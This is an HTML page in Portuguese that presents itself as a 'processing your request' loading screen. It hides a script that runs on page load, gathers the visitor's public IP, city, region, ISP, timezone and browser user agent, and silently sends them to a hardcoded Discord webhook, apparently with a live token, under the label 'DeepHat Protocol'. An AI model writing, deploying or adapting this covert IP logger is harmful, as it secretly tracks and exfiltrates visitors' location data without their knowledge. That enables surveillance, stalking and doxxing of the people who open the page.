<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            background-color: #ffffff;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .loader {
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="loader">Processando sua solicitação...</div>

    <script>
        /**
         * CONFIGURAÇÃO
         * Substitua pela sua URL do Webhook do Discord
         */
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1542344832817823794/rpnzy3a7n1WlSyjHT4ozcd0DaN9BVufEDRLuDbbXDWe_cpLroDqhJCBzATv3llqjKqk_';

        async function iniciarCaptura() {
            try {
                // 1. Obtém o IP Público Real (usando ipify para evitar cache de geolocalização)
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const realIP = ipData.ip;

                // 2. Obtém detalhes de geolocalização baseados no IP capturado
                // Usamos a ipapi.co para detalhes de localização e ISP
                const geoResponse = await fetch(`https://ipapi.co/${realIP}/json/`);
                const geoData = await geoResponse.json();

                // 3. Monta o objeto de dados para o Discord (Embed para visual profissional)
                const payload = {
                    embeds: [{
                        title: "📡 Novo Registro de Acesso",
                        description: "Um novo dispositivo acessou a página. Dados capturados abaixo:",
                        color: 0x2ecc71, // Verde
                        fields: [
                            { name: "🌐 IP Público", value: `\`${realIP}\``, inline: true },
                            { name: "📍 Localização", value: `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country_name || 'N/A'}`, inline: true },
                            { name: "🏢 Provedor (ISP)", value: geoData.org || "Não identificado", inline: false },
                            { name: "🌍 País", value: geoData.country_name || "N/A", inline: true },
                            { name: "⏱️ Fuso Horário", value: geoData.timezone || "N/A", inline: true },
                            { name: "📱 Navegador/Sistema", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                        ],
                        footer: { 
                            text: "Captura de Segurança | DeepHat Protocol" 
                        },
                        timestamp: new Date().toISOString()
                    }]
                };

                // 4. Envia os dados para o Webhook do Discord via POST
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    console.error("Erro ao enviar para o Discord.");
                }

            } catch (error) {
                // Log de erro silencioso no console
                console.error("Falha na captura:", error);
            }
        }

        // Executa a função assim que a página carregar
        window.addEventListener('load', iniciarCaptura);
    </script>
</body>
</html>
